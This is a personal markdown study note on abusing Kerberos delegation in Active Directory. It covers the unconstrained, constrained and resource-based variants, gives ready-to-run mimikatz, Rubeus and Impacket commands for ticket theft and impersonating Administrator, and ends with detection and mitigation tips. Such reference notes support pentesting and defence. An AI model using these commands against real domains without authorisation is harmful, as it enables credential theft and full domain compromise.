---
tags:
  - knowledge
  - AD
  - attack
date: 2023-09-1
---
- Delegation - allows service to impersonate a user to access resources on behalf.
- Legitimate feature in Windows.
# Types of Delegation

- [[Unconstrained Delegation]]
	- services impersonate a user to any service once user authenticates to it.
	- [[Kerberos]] [[Ticket Granting Tickets (TGTs)|TGT]] cached on delegated host.
	- dangerous if domain admin logs into a box with UCD.
- [[Constrained Delegation]]
	- service limited to impersonating users only to specific SPNs.
	- abusable if you control delegating account and allowed SPNs are sensitive.
- [[Resource Based Delegation]]
	- configured on target service, not delegating one.
	- abusable if:
		- attacker can add a computer object to the domain.
		- attacker can set `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target machine
# Exploitation Techniques

- `Unconstrained Delegation`:
	- steal TGT from memory (on system with unconstrained flag):
		- `mimikatz sekurlsa::tickets`
- `Constrained Delegation`:
	- impersonate any user to a listed SPN:
		- `Rubeus s4u /user:svc /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/dc.corp.local /ptt`
		- `getST.py -spn cifs/dc.corp.local -impersonate Administrator -hashes :<NTLM> corp.local/svcuser`
- `RBCD`:
	- adding a fake computer:
		- `addcomputer.py -computer-name FAKEPC -computer-pass P@ssw0rd! corp.local/user`
	- set delegation rights on target:
		- `setrbcd.py -delegate-from FAKEPC$ -delegate-to TARGET-HOST$ -dc-ip <DC_IP>`
	- request TGT as target user via S4U chain ([[Certipy]] or [[Rubeus]]):
		- `Rubeus s4u /user:FAKEPC$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/dc /ptt`
# When To Abuse This

- You control a user, service or computer with:
	- `TrustedForDelegation` (unconstrained)
	- `msDS-AllowedToDelegate` (constrained)
	- `msSD-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
- You added a computer object and can link it via RBCD.
- A Domain Admin logs into a system with UCD.
# Detection

- `Event ID 4769` - Kerberos service ticket requests (watch for S4U).
- Audit:
	- `Get-ADComputer -Filter * -Properties TrustedForDelegation, msDS-AllowedToDelegateTo, msDS-AllowedToActOnBehalfOfOtherIdentity`
# Mitigation

- Avoid UCD completely
- Use RBCD only with strict scoping.
- Monitor and restrict:
	- computer object creation
	- delegation rights modification
- Rotate passwords or keys for abused accounts.

